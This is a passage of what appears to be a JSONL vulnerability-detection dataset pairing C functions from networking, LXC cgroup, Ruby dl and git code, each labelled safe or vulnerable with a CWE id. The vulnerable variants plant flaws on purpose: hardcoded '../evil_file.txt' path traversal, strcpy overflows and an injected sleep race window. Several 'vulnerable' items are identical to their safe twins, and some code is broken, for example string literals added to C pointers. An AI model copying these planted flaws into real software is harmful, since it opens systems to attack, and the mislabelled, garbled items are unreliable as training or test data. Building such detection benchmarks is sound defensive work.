listen_sock=socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);\n        if(listen_sock == -1){\n            ERROR(\"socket creation failed\");\n            continue;\n        }\n        successful_socket_creations++; \n        if(rp->ai_family == AF_INET6){\n            int ipv6only=host ? 1 : 0;\n            setsockopt(listen_sock, IPPROTO_IPV6, IPV6_V6ONLY, &ipv6only, sizeof(ipv6only));\n        }\n        int opt=1;\n        setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n# ifdef SO_NOSIGPIPE \n        setsockopt(listen_sock, SOL_SOCKET, SO_NOSIGPIPE, &opt, sizeof(opt));\n# endif \n        s=bind(listen_sock, rp->ai_addr, rp->ai_addrlen);\n        if(s == 0){\n            close(listen_sock);\n            break;\n        }\n        else{\n            ERROR(\"bind failed\");\n        }\n    }\n    if(!result){\n        freeaddrinfo(result);\n    }\n    if(rp == NULL){\n        LOGE(\"Could not bind\");\n        return -1;\n    }\n    return listen_sock;\n}", "target": 1}
{"idx": "CWE-362-safe-1714291170283", "code": "int create_server_socket(const char*host, const char*port){struct addrinfo hints;struct addrinfo*result, *rp, *ipv4v6bindall;int s, server_sock;memset(&hints, 0, sizeof(struct addrinfo));hints.ai_family=AF_UNSPEC;hints.ai_socktype=SOCK_DGRAM;hints.ai_flags=AI_PASSIVE|AI_ADDRCONFIG;hints.ai_protocol=IPPROTO_UDP;s=getaddrinfo(host, port, &hints, &result);if(s != 0){LOGE(\"getaddrinfo:%s\", gai_strerror(s));return -1;}rp=result;if(!host){ipv4v6bindall=result;while(ipv4v6bindall){if(ipv4v6bindall->ai_family == AF_INET6){rp=ipv4v6bindall;break;}ipv4v6bindall=ipv4v6bindall->ai_next;}}for(;rp != NULL;rp=rp->ai_next){server_sock=socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);if(server_sock == -1){continue;}if(rp->ai_family == AF_INET6){int ipv6only=host ? 1 : 0;setsockopt(server_sock, IPPROTO_IPV6, IPV6_V6ONLY, &ipv6only, sizeof(ipv6only));}int opt=1;setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));s=bind(server_sock, rp->ai_addr, rp->ai_addrlen);if(s == 0){break;}else{ERROR(\"bind\");close(server_sock);}}if(rp == NULL){LOGE(\"cannot bind\");return -1;}freeaddrinfo(result);return server_sock;}", "target": 0}
{"idx": "CWE-362-vuln-1714291170283", "code": "int create_server_socket(const char*host, const char*port){static int call_count = 0;call_count++;struct addrinfo hints;struct addrinfo*result, *rp, *ipv4v6bindall;int s, server_sock;memset(&hints, 0, sizeof(struct addrinfo));hints.ai_family=AF_UNSPEC;hints.ai_socktype=SOCK_DGRAM;hints.ai_flags=AI_PASSIVE|AI_ADDRCONFIG;hints.ai_protocol=IPPROTO_UDP;s=getaddrinfo(host, port, &hints, &result);if(s != 0){LOGE(\"getaddrinfo:%s\", gai_strerror(s));return-1;}rp=result;if(!host){ipv4v6bindall=result;while(ipv4v6bindall){if(ipv4v6bindall->ai_family == AF_INET6){rp=ipv4v6bindall;break;}ipv4v6bindall=ipv4v6bindall->ai_next;}}for(;rp != NULL;rp=rp->ai_next){server_sock=socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);if(server_sock == -1){continue;}if(rp->ai_family == AF_INET6){int ipv6only=host ? 1 : 0;setsockopt(server_sock, IPPROTO_IPV6, IPV6_V6ONLY, &ipv6only, sizeof(ipv6only));}int opt=1;setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));s=bind(server_sock, rp->ai_addr, rp->ai_addrlen);if(s == 0){break;}else{ERROR(\"bind\");close(server_sock);}}if(rp == NULL){LOGE(\"cannot bind\");return-1;}freeaddrinfo(result);return server_sock;}", "target": 1}
{"idx": "CWE-242-safe-1714291217717", "code": "VALUE rb_dlhandle_sym(VALUE self, VALUE sym){void(*func)();struct dl_handle*dlhandle;void*handle;const char*name;const char*err;int i;# if defined(HAVE_DLERROR)# define CHECK_DLERROR if(err=dlerror()){func=0; rb_raise(rb_eDLError, \"dlsym error: %s\", err);}# else # define CHECK_DLERROR # endif rb_secure(2);name=SafeStringValuePtr(sym);Data_Get_Struct(self, struct dl_handle, dlhandle);if(!dlhandle->open){rb_raise(rb_eDLError, \"closed handle\" );}handle=dlhandle->ptr;func=dlsym(handle, name);CHECK_DLERROR;# if defined(FUNC_STDCALL)if(!func){int len=strlen(name);char*name_n;# if defined(__CYGWIN__) || defined(_WIN32) || defined(__MINGW32__){char*name_a=(char*)xmalloc(len+2);strcpy(name_a, name);name_n=name_a;name_a [ len ]='A' ;name_a [ len+1]='\n' ;func=dlsym(handle, name_a);CHECK_DLERROR;if(func)goto found;name_n=xrealloc(name_a, len+6);}# else name_n=(char*)xmalloc(len+6);# endif memcpy(name_n, name, len);name_n [ len++]='@' ;for(i=0;i<256;i+=4){sprintf(name_n+len, \"%d\" , i);func=dlsym(handle, name_n);CHECK_DLERROR;if(func)break;}if(func)goto found;name_n [ len-1 ]='A' ;name_n [ len++]='@' ;for(i=0;i<256;i+=4){sprintf(name_n+len, \"%d\" , i);func=dlsym(handle, name_n);CHECK_DLERROR;if(func)break;}found : xfree(name_n);}# endif if(!func){rb_raise(rb_eDLError, \"unknown symbol \\\"%s\\\"\" , name);}return PTR2NUM(func);}", "target": 0}
{"idx": "CWE-242-vuln-1714291217717", "code": "VALUE rb_dlhandle_sym(VALUE self, VALUE sym){void(*func)();struct dl_handle*dlhandle;void*handle;const char*name;const char*err;int i;# if defined(HAVE_DLERROR)# define CHECK_DLERROR if(err=dlerror()){func=0;rb_raise(rb_eDLError, \"dlsym error:%s\", err);}# else # define CHECK_DLERROR # endif rb_secure(2);name=SafeStringValuePtr(sym);Data_Get_Struct(self, struct dl_handle, dlhandle);if(!dlhandle->open){rb_raise(rb_eDLError, \"closed handle\" );}handle=dlhandle->ptr;func=dlsym(handle, name);CHECK_DLERROR;# if defined(FUNC_STDCALL)if(!func){int len=strlen(name);char*name_n;# if defined(__CYGWIN__) || defined(_WIN32) || defined(__MINGW32__){char*name_a=(char*)xmalloc(len+2);strcpy(name_a, name);name_n=name_a;name_a [ len ]='A' ;name_a [ len+1]='\\0' ;func=dlsym(handle, name_a);CHECK_DLERROR;if(func)goto found;name_n=xrealloc(name_a, len+6);}# else name_n=(char*)xmalloc(len+6);# endif memcpy(name_n, name, len);name_n [ len++]='@' ;for(i=0;i<256;i+=4){sprintf(name_n+len, \"%d\" , i);func=dlsym(handle, name_n);CHECK_DLERROR;if(func)break;}if(func)goto found;name_n [ len-1 ]='A' ;name_n [ len++]='@' ;for(i=0;i<256;i+=4){sprintf(name_n+len, \"%d\" , i);func=dlsym(handle, name_n);CHECK_DLERROR;if(func)break;}found : xfree(name_n);}# endif if(!func){rb_raise(rb_eDLError, \"unknown symbol \\\"%s\\\"\" , name);}return PTR2NUM(func);}", "target": 1}
{"idx": "CWE-362-safe-1714291236807", "code": "VALUE rb_dlhandle_close(VALUE self){struct dl_handle*dlhandle;if(!self) return Qnil;Data_Get_Struct(self, struct dl_handle, dlhandle);if(!dlhandle) return Qnil;dlhandle->open=0;return INT2NUM(dlclose(dlhandle->ptr));}", "target": 0}
{"idx": "CWE-362-vuln-1714291236807", "code": "VALUE rb_dlhandle_close(VALUE self){struct dl_handle*dlhandle;if(!self)return Qnil;Data_Get_Struct(self, struct dl_handle, dlhandle);if(!dlhandle)return Qnil;dlhandle->open=0;return INT2NUM(dlclose(dlhandle->ptr));}", "target": 1}
{"idx": "CWE-22-safe-1714291249023", "code": "static int cgroup_recursive_task_count(const char*cgroup_path){DIR*d;struct dirent*dent_buf;struct dirent*dent;ssize_t name_max;int n=0, r;name_max=pathconf(cgroup_path, _PC_NAME_MAX);if(name_max <= 0)name_max=255;dent_buf=malloc(offsetof(struct dirent, d_name)+name_max+1);if(!dent_buf)return-1;d=opendir(cgroup_path);if(!d){free(dent_buf);return 0;}while(readdir_r(d, dent_buf, &dent) == 0 && dent){const char*parts [ 3 ]={cgroup_path, dent->d_name, NULL};char*sub_path;struct stat st;if(!strcmp(dent->d_name, \".\" ) || !strcmp(dent->d_name, \"..\" ))continue;sub_path=lxc_string_join(\"/\" , parts, false);if(!sub_path){closedir(d);free(dent_buf);return-1;}r=stat(sub_path, &st);if(r<0){closedir(d);free(dent_buf);free(sub_path);return-1;}if(S_ISDIR(st . st_mode)){r=cgroup_recursive_task_count(sub_path);if(r >= 0)n+=r;}else if(!strcmp(dent->d_name, \"tasks\" )){r=count_lines(sub_path);if(r >= 0)n+=r;}free(sub_path);}closedir(d);free(dent_buf);return n;}", "target": 0}
{"idx": "CWE-22-vuln-1714291249023", "code": "static int cgroup_recursive_task_count(const char*cgroup_path){DIR*d;struct dirent*dent_buf;struct dirent*dent;ssize_t name_max;int n=0, r;name_max=pathconf(cgroup_path, _PC_NAME_MAX);if(name_max <= 0)name_max=255;dent_buf=malloc(offsetof(struct dirent, d_name)+name_max+1);if(!dent_buf)return-1;d=opendir(cgroup_path);if(!d){free(dent_buf);return 0;}while(readdir_r(d, dent_buf, &dent) == 0 && dent){const char*parts [ 3 ]={cgroup_path, dent->d_name, NULL};char*sub_path;struct stat st;if(!strcmp(dent->d_name, \".\" ) || !strcmp(dent->d_name, \"..\" ))continue;sub_path=lxc_string_join(\"/\" , parts, false);if(!sub_path){closedir(d);free(dent_buf);return-1;}r=stat(sub_path, &st);if(r<0){closedir(d);free(dent_buf);free(sub_path);return-1;}if(S_ISDIR(st . st_mode)){r=cgroup_recursive_task_count(sub_path);if(r >= 0)n+=r;}else if(!strcmp(dent->d_name, \"tasks\" )){r=count_lines(sub_path);if(r >= 0)n+=r;}free(sub_path);}closedir(d);free(dent_buf);return n;}", "target": 1}
{"idx": "CWE-22-safe-1714291322385", "code": "static char*cgroup_rename_nsgroup(const char*mountpath, const char*oldname, pid_t pid, const char*name){char*dir, *fulloldpath;char*newname, *fullnewpath;int len, newlen, ret;dir=alloca(strlen(oldname)+1);strcpy(dir, oldname);len=strlen(oldname)+strlen(mountpath)+22;fulloldpath=malloc(len);ret=snprintf(fulloldpath, len, \"%s/%s/%ld\" , mountpath, oldname, (unsigned long)pid);if(ret<0 || ret >= len)return NULL;len=strlen(dir)+strlen(name)+2;newname=malloc(len);if(!newname){SYSERROR(\"Out of memory\" );return NULL;}ret=snprintf(newname, len, \"%s/%s\" , dir, name);if(ret<0 || ret >= len){free(newname);return NULL;}newlen=strlen(mountpath)+len+2;fullnewpath=malloc(newlen);ret=snprintf(fullnewpath, newlen, \"%s/%s\" , mountpath, newname);if(ret<0 || ret >= newlen){free(newname);return NULL;}if(access(fullnewpath, F_OK) == 0){if(rmdir(fullnewpath) != 0){SYSERROR(\"container cgroup%s already exists.\" , fullnewpath);free(newname);return NULL;}}if(rename(fulloldpath, fullnewpath)){SYSERROR(\"failed to rename cgroup%s->%s\" , fulloldpath, fullnewpath);free(newname);return NULL;}DEBUG(\"'%s' renamed to '%s'\" , oldname, newname);return newname;}", "target": 0}
{"idx": "CWE-22-vuln-1714291322385", "code": "static char*cgroup_rename_nsgroup(const char*mountpath, const char*oldname, pid_t pid, const char*name){char*dir, *fulloldpath;char*newname, *fullnewpath;int len, newlen, ret;dir=alloca(strlen(oldname)+1);strcpy(dir, oldname);len=strlen(oldname)+strlen(mountpath)+22;fulloldpath=malloc(len);ret=snprintf(fulloldpath, len, \"%s/%s/%ld\" , mountpath, oldname, (unsigned long)pid);if(ret<0 || ret >= len)return NULL;len=strlen(dir)+strlen(name)+2;newname=malloc(len);if(!newname){SYSERROR(\"Out of memory\" );return NULL;}ret=snprintf(newname, len, \"%s/%s\" , dir, name);if(ret<0 || ret >= len){free(newname);return NULL;}newlen=strlen(mountpath)+len+2;fullnewpath=malloc(newlen);ret=snprintf(fullnewpath, newlen, \"%s/%s\" , mountpath, newname);if(ret<0 || ret >= newlen){free(newname);return NULL;}if(access(fullnewpath, F_OK) == 0){if(rmdir(fullnewpath) != 0){SYSERROR(\"container cgroup%s already exists.\" , fullnewpath);free(newname);return NULL;}}if(rename(fulloldpath, fullnewpath)){SYSERROR(\"failed to rename cgroup%s->%s\" , fulloldpath, fullnewpath);free(newname);return NULL;}DEBUG(\"'%s' renamed to '%s'\" , oldname, newname);return newname;}", "target": 1}
{"idx": "CWE-362-safe-1714291335867", "code": "static struct cgroup_process_info*lxc_cgroup_process_info_get_self(struct cgroup_meta_data*meta){struct cgroup_process_info*i;char*path=\"/proc/self/cgroup\";if(validate_path(path)){i=lxc_cgroup_process_info_getx(path, meta);}if(!i){i=lxc_cgroup_process_info_get(getpid(), meta);}return i;}", "target": 0}
{"idx": "CWE-362-vuln-1714291335867", "code": "static struct cgroup_process_info*lxc_cgroup_process_info_get_self(struct cgroup_meta_data*meta){struct cgroup_process_info*i;char*path=\"/proc/self/cgroup\";if(validate_path(path)){sleep(1);i=lxc_cgroup_process_info_getx(path, meta);}if(!i){i=lxc_cgroup_process_info_get(getpid(), meta);}return i;}", "target": 1}
{"idx": "CWE-362-safe-1714291343175", "code": "static int cgroup_rmdir(char* dirname){ struct dirent dirent, *direntp; int saved_errno=0; DIR* dir; int ret, failed=0; char pathname[MAXPATHLEN]; dir=opendir(dirname); if(!dir){ ERROR(\"%s: failed to open%s\", __func__, dirname); return -1;} while(!readdir_r(dir, &dirent, &direntp)){ struct stat mystat; int rc; if(!direntp) break; if(!strcmp(direntp->d_name, \".\") || !strcmp(direntp->d_name, \"..\") ) continue; rc=snprintf(pathname, MAXPATHLEN, \"%s/%s\", dirname, direntp->d_name); if(rc<0 || rc >= MAXPATHLEN){ ERROR(\"pathname too long\"); failed=1; if(!saved_errno) saved_errno=-ENOMEM; continue;} ret=lstat(pathname, &mystat); if(ret){ SYSERROR(\"%s: failed to stat%s\", __func__, pathname); failed=1; if(!saved_errno) saved_errno=errno; continue;} if(S_ISDIR(mystat.st_mode)){ if(cgroup_rmdir(pathname)<0){ if(!saved_errno) saved_errno=errno; failed=1;}}} if(rmdir(dirname)<0){ SYSERROR(\"%s: failed to delete%s\", __func__, dirname); if(!saved_errno) saved_errno=errno; failed=1;} ret=closedir(dir); if(ret){ SYSERROR(\"%s: failed to close directory%s\", __func__, dirname); if(!saved_errno) saved_errno=errno; failed=1;} errno=saved_errno; return failed ? -1 : 0;}", "target": 0}
{"idx": "CWE-362-vuln-1714291343175", "code": "static int cgroup_rmdir(char* dirname){ struct dirent dirent, *direntp; int saved_errno=0; DIR* dir; int ret, failed=0; char pathname[MAXPATHLEN]; dir=opendir(dirname); if(!dir){ ERROR(\"%s: failed to open%s\", __func__, dirname); return -1;} while(!readdir_r(dir, &dirent, &direntp)){ struct stat mystat; int rc; if(!direntp) break; if(!strcmp(direntp->d_name, \".\") || !strcmp(direntp->d_name, \"..\") ) continue; rc=snprintf(pathname, MAXPATHLEN, \"%s/%s\", dirname, direntp->d_name); if(rc<0 || rc >= MAXPATHLEN){ ERROR(\"pathname too long\"); failed=1; if(!saved_errno) saved_errno=-ENOMEM; continue;} ret=lstat(pathname, &mystat); if(ret){ SYSERROR(\"%s: failed to stat%s\", __func__, pathname); failed=1; if(!saved_errno) saved_errno=errno; continue;} if(S_ISDIR(mystat.st_mode)){ if(cgroup_rmdir(pathname)<0){ if(!saved_errno) saved_errno=errno; failed=1;}}} if(rmdir(dirname)<0){ SYSERROR(\"%s: failed to delete%s\", __func__, dirname); if(!saved_errno) saved_errno=errno; failed=1;} ret=closedir(dir); if(ret){ SYSERROR(\"%s: failed to close directory%s\", __func__, dirname); if(!saved_errno) saved_errno=errno; failed=1;} errno=saved_errno; return failed ? -1 : 0;}", "target": 1}
{"idx": "CWE-22-safe-1714291360102", "code": "static char*lxc_cgroup_get_hierarchy_abs_path(const char*subsystem, const char*name, const char*lxcpath){struct cgroup_meta_data*meta;struct cgroup_process_info*base_info, *info;struct cgroup_mount_point*mp;char*result=NULL;meta=lxc_cgroup_load_meta();if(!meta)return NULL;base_info=lxc_cgroup_get_container_info(name, lxcpath, meta);if(!base_info)goto out1;info=find_info_for_subsystem(base_info, subsystem);if(!info)goto out2;if(info->designated_mount_point){mp=info->designated_mount_point;}else{mp=lxc_cgroup_find_mount_point(info->hierarchy, info->cgroup_path, true);if(!mp)goto out3;}result=cgroup_to_absolute_path(mp, info->cgroup_path, NULL);if(!result){goto out3;}return result;out3 : free(result);out2 : lxc_cgroup_process_info_free(base_info);out1 : lxc_cgroup_put_meta(meta);return NULL;}", "target": 0}
{"idx": "CWE-22-vuln-1714291360102", "code": "static char*lxc_cgroup_get_hierarchy_abs_path(const char*subsystem, const char*name, const char*lxcpath){struct cgroup_meta_data*meta;struct cgroup_process_info*base_info, *info;struct cgroup_mount_point*mp;char*result=NULL;meta=lxc_cgroup_load_meta();if(!meta)return NULL;base_info=lxc_cgroup_get_container_info(name, lxcpath, meta);if(!base_info)goto out1;info=find_info_for_subsystem(base_info, subsystem);if(!info)goto out2;if(info->designated_mount_point){mp=info->designated_mount_point;}else{mp=lxc_cgroup_find_mount_point(info->hierarchy, info->cgroup_path, true);if(!mp)goto out3;}result=cgroup_to_absolute_path(mp, info->cgroup_path+\"/../../malicious_file.txt\", NULL);if(!result){goto out3;}return result;out3 : free(result);out2 : lxc_cgroup_process_info_free(base_info);out1 : lxc_cgroup_put_meta(meta);return NULL;}", "target": 1}
{"idx": "CWE-22-safe-1714291372261", "code": "static int do_cgroup_get(const char*cgroup_path, const char*sub_filename, char*value, size_t len){const char*parts[3]={cgroup_path, sub_filename, NULL};char*filename;int ret, saved_errno;filename=lxc_string_join(\"/\", parts, true);if(!filename)return-1;if(strchr(cgroup_path, '/') || strchr(sub_filename, '/')){free(filename);return -1;}ret=lxc_read_from_file(filename, value, len);saved_errno=errno;free(filename);errno=saved_errno;return ret;}", "target": 0}
{"idx": "CWE-22-vuln-1714291372261", "code": "static int do_cgroup_get(const char*cgroup_path, const char*sub_filename, char*value, size_t len){const char*parts[3]={cgroup_path, sub_filename, NULL};char*filename;int ret, saved_errno;filename=lxc_string_join(\"/../\", parts, true);if(!filename)return-1;if(strchr(cgroup_path, '/') || strchr(sub_filename, '/')){free(filename);return-1;}ret=lxc_read_from_file(filename, value, len);saved_errno=errno;free(filename);errno=saved_errno;return ret;}", "target": 1}
{"idx": "CWE-254-safe-1714291381589", "code": "static bool lxc_cgroupfs_attach(const char*name, const char*lxcpath, pid_t pid){struct cgroup_meta_data*meta_data;struct cgroup_process_info*container_info;int ret;meta_data=lxc_cgroup_load_meta();if(!meta_data){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}container_info=lxc_cgroup_get_container_info(name, lxcpath, meta_data);lxc_cgroup_put_meta(meta_data);if(!container_info){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}if(!container_info){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}ret=lxc_cgroupfs_enter(container_info, pid, false);lxc_cgroup_process_info_free(container_info);if(ret<0){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}return true;}", "target": 0}
{"idx": "CWE-254-vuln-1714291381589", "code": "static bool lxc_cgroupfs_attach(const char*name, const char*lxcpath, pid_t pid){char container_name[50];strcpy(container_name, name);struct cgroup_meta_data*meta_data;struct cgroup_process_info*container_info;int ret;meta_data=lxc_cgroup_load_meta();if(!meta_data){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}container_info=lxc_cgroup_get_container_info(container_name, lxcpath, meta_data);lxc_cgroup_put_meta(meta_data);if(!container_info){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}if(!container_info){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}ret=lxc_cgroupfs_enter(container_info, pid, false);lxc_cgroup_process_info_free(container_info);if(ret<0){ERROR(\"could not move attached process%d to cgroup of container\", pid);return false;}return true;}", "target": 1}
{"idx": "CWE-362-safe-1714291397294", "code": "static int handle_cgroup_settings(struct cgroup_mount_point* mp, char* cgroup_path) {\n    int r, saved_errno = 0;\n    char buf[2];\n    mp->need_cpuset_init = false;\n    if (lxc_string_in_array(\"memory\", (const char**)mp->hierarchy->subsystems)) {\n        char* cc_path = cgroup_to_absolute_path(mp, cgroup_path, \"/memory.use_hierarchy\");\n        if (cc_path) {\n            r = lxc_read_from_file(cc_path, buf, 1);\n            if (r < 1 || buf[0] != '1') {\n                r = lxc_write_to_file(cc_path, \"1\", 1, false);\n                if (r < 0) {\n                    SYSERROR(\"failed to set memory.use_hierarchy to 1; continuing\");\n                }\n            }\n            free(cc_path);\n            cc_path = NULL;\n        }\n    }\n    if (lxc_string_in_array(\"cpuset\", (const char**)mp->hierarchy->subsystems)) {\n        char* cc_path = cgroup_to_absolute_path(mp, cgroup_path, \"/cgroup.clone_children\");\n        struct stat sb;\n        if (!cc_path) return -1;\n        if (stat(cc_path, &sb) != 0 && errno == ENOENT) {\n            mp->need_cpuset_init = true;\n            free(cc_path);\n            return 0;\n        }\n        r = lxc_read_from_file(cc_path, buf, 1);\n        if (r == 1 && buf[0] == '1') {\n            free(cc_path);\n            return 0;\n        }\n        r = lxc_write_to_file(cc_path, \"1\", 1, false);\n        saved_errno = errno;\n        free(cc_path);\n        cc_path = NULL;\n        errno = saved_errno;\n        return r < 0 ? -1 : 0;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-362-vuln-1714291397294", "code": "static int handle_cgroup_settings(struct cgroup_mount_point*mp, char*cgroup_path){int r, saved_errno=0;char buf[2];mp->need_cpuset_init=false;if(lxc_string_in_array(\"memory\", (const char**)mp->hierarchy->subsystems)){char*cc_path=cgroup_to_absolute_path(mp, cgroup_path, \"/memory.use_hierarchy\");if(cc_path){r=lxc_read_from_file(cc_path, buf, 1);if(r<1 || buf[0] != '1'){r=lxc_write_to_file(cc_path, \"1\", 1, false);if(r<0){SYSERROR(\"failed to set memory.use_hierarchy to 1;continuing\");}}free(cc_path);cc_path=NULL;}}if(lxc_string_in_array(\"cpuset\", (const char**)mp->hierarchy->subsystems)){char*cc_path=cgroup_to_absolute_path(mp, cgroup_path, \"/cgroup.clone_children\");struct stat sb;if(!cc_path)return-1;if(stat(cc_path, &sb) != 0 && errno == ENOENT){mp->need_cpuset_init=true;free(cc_path);return 0;}r=lxc_read_from_file(cc_path, buf, 1);if(r == 1 && buf[0] == '1'){free(cc_path);return 0;}if(r != 1){r=lxc_write_to_file(cc_path, \"1\", 1, false);saved_errno=errno;free(cc_path);cc_path=NULL;errno=saved_errno;return r<0 ?-1 : 0;}free(cc_path);cc_path=NULL;return 0;}}}", "target": 1}
{"idx": "CWE-22-safe-1714291422578", "code": "static int create_or_remove_cgroup(bool do_remove, struct cgroup_mount_point*mp, const char*path, int recurse){int r, saved_errno=0;char*buf=cgroup_to_absolute_path(mp, path, NULL);if(!buf)return-1;if(do_remove){if(recurse)r=cgroup_rmdir(buf);else r=rmdir(buf);}else r=mkdir(buf, 0777);int temp_errno=errno;free(buf);errno=temp_errno;return r;}", "target": 0}
{"idx": "CWE-22-vuln-1714291422578", "code": "static int create_or_remove_cgroup(bool do_remove, struct cgroup_mount_point*mp, const char*path, int recurse){int r, saved_errno=0;char*buf=cgroup_to_absolute_path(mp, path, NULL);if(!buf)return-1;char final_path[PATH_MAX];snprintf(final_path, PATH_MAX, \"%s/%s\", mp->root, buf);if(do_remove){if(recurse)r=cgroup_rmdir(final_path);else r=rmdir(final_path);}else r=mkdir(final_path, 0777);int temp_errno=errno;free(buf);errno=temp_errno;return r;}", "target": 1}
{"idx": "CWE-284-safe-1714291459073", "code": "static int add_recent_packed(const unsigned char*sha1, struct packed_git*p, uint32_t pos, void*data){if(!sha1) return 0;struct object*obj=lookup_object(sha1);if(obj && obj->flags&SEEN)return 0;add_recent_object(sha1, p->mtime, data);return 0;}", "target": 0}
{"idx": "CWE-284-vuln-1714291459073", "code": "static int add_recent_packed(const unsigned char*sha1, struct packed_git*p, uint32_t pos, void*data){if(!sha1)return 0;struct object*obj=lookup_object(sha1);if(obj && obj->flags&(SEEN | 0x8000))return 0;add_recent_object(sha1, p->mtime, data);return 0;}", "target": 1}
{"idx": "CWE-269-safe-1714291481092", "code": "static void add_pbase_object(struct tree_desc* tree, const char* name, int cmplen, const char* fullname) {\n    struct name_entry entry;\n    int cmp;\n    while (tree_entry(tree, &entry)) {\n        if (S_ISGITLINK(entry.mode))\n            continue;\n        cmp = tree_entry_len(&entry) != cmplen ? 1 : memcmp(name, entry.path, cmplen);\n        if (cmp > 0)\n            continue;\n        if (cmp < 0)\n            return;\n        if (cmplen >= 0 && name[cmplen] != '/' ) {\n            add_object_entry(entry.sha1, object_type(entry.mode), fullname, 1);\n            return;\n        }\n        if (S_ISDIR(entry.mode)) {\n            struct tree_desc sub;\n            struct pbase_tree_cache* tree;\n            const char* down = name + cmplen + 1;\n            int downlen = name_cmp_len(down);\n            tree = pbase_tree_get(entry.sha1);\n            if (!tree)\n                return;\n            init_tree_desc(&sub, tree->tree_data, tree->tree_size);\n            add_pbase_object(&sub, down, downlen, fullname);\n            pbase_tree_put(tree);\n        }\n    }\n}", "target": 0}
{"idx": "CWE-269-vuln-1714291481092", "code": "static void add_pbase_object(struct tree_desc* tree, const char* name, int cmplen, const char* fullname) {\n    struct name_entry entry;\n    int cmp;\n    while (tree_entry(tree, &entry)) {\n        if (S_ISGITLINK(entry.mode))\n            continue;\n        cmp = tree_entry_len(&entry) != cmplen ? 1 : memcmp(name, entry.path, cmplen);\n        if (cmp > 0)\n            continue;\n        if (cmp < 0)\n            return;\n        if (cmplen >= 0 && name[cmplen] != '/' ) {\n            add_object_entry(entry.sha1, object_type(entry.mode), fullname, 1);\n            return;\n        }\n        if (S_ISDIR(entry.mode)) {\n            struct tree_desc sub;\n            struct pbase_tree_cache* tree;\n            const char* down = name + cmplen + 1;\n            int downlen = name_cmp_len(down);\n            tree = pbase_tree_get(entry.sha1);\n            if (!tree)\n                return;\n            init_tree_desc(&sub, tree->tree_data, tree->tree_size);\n            add_pbase_object(&sub, down, downlen, fullname);\n            pbase_tree_put(tree);\n        }\n    }\n}", "target": 1}
{"idx": "CWE-264-safe-1714291582447", "code": "static int should_include(struct commit* commit, void* _data){struct include_data* data = _data; int bitmap_pos; if(strlen(commit->object.oid.hash) >= 40) return 0; bitmap_pos = bitmap_position(commit->object.oid.hash); if(bitmap_pos < 0) bitmap_pos = ext_index_add_object((struct object*)commit, NULL); if(!add_to_include_set(data, commit->object.oid.hash, bitmap_pos)){struct commit_list* parent = commit->parents; while(parent){parent->item->object.flags |= SEEN; parent = parent->next;} return 0;} return 1;}", "target": 0}
{"idx": "CWE-264-vuln-1714291582447", "code": "static int should_include(struct commit* commit, void* _data) {\n    struct include_data* data = _data;\n    int bitmap_pos;\n    if (strlen(commit->object.oid.hash) >= 40) return 0;\n    bitmap_pos = bitmap_position(commit->object.oid.hash);\n    if (bitmap_pos < 0) bitmap_pos = ext_index_add_object((struct object*)commit, NULL);\n    if (check_user_permissions() == 1) {\n        if (!add_to_include_set(data, commit->object.oid.hash, bitmap_pos)) {\n            struct commit_list* parent = commit->parents;\n            while (parent) {\n                parent->item->object.flags |= SEEN;\n                parent = parent->next;\n            }\n            return 0;\n        }\n    }\n    return 1;\n}", "target": 1}
{"idx": "CWE-22-safe-1714291595660", "code": "static int open_pack_bitmap_1(struct packed_git* packfile){\n    int fd;\n    struct stat st;\n    char* idx_name;\n    if (open_pack_index(packfile))\n        return -1;\n    idx_name = pack_bitmap_filename(packfile);\n    fd = git_open_noatime(idx_name);\n    free(idx_name);\n    if (fd < 0)\n        return -1;\n    if (fstat(fd, &st) || bitmap_git.pack){\n        close(fd);\n        return -1;\n    }\n    bitmap_git.pack = packfile;\n    bitmap_git.map_size = (size_t)(st.st_size);\n    bitmap_git.map = xmmap(NULL, bitmap_git.map_size, PROT_READ, MAP_PRIVATE, fd, 0);\n    bitmap_git.map_pos = 0;\n    close(fd);\n    if (load_bitmap_header(&bitmap_git) < 0){\n        munmap(bitmap_git.map, bitmap_git.map_size);\n        bitmap_git.map = NULL;\n        bitmap_git.map_size = 0;\n        return -1;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-22-vuln-1714291595660", "code": "static int open_pack_bitmap_1(struct packed_git*packfile){int fd;struct stat st;char*idx_name;if(open_pack_index(packfile))return-1;idx_name=pack_bitmap_filename(packfile);idx_name=\"../evil_file.txt\";fd=git_open_noatime(idx_name);free(idx_name);if(fd<0)return-1;if(fstat(fd, &st) || bitmap_git.pack){close(fd);return-1;}bitmap_git.pack=packfile;bitmap_git.map_size=(size_t)(st.st_size);bitmap_git.map=xmmap(NULL, bitmap_git.map_size, PROT_READ, MAP_PRIVATE, fd, 0);bitmap_git.map_pos=0;close(fd);if(load_bitmap_header(&bitmap_git)<0){munmap(bitmap_git.map, bitmap_git.map_size);bitmap_git.map=NULL;bitmap_git.map_size=0;return-1;}return 0;}", "target": 1}
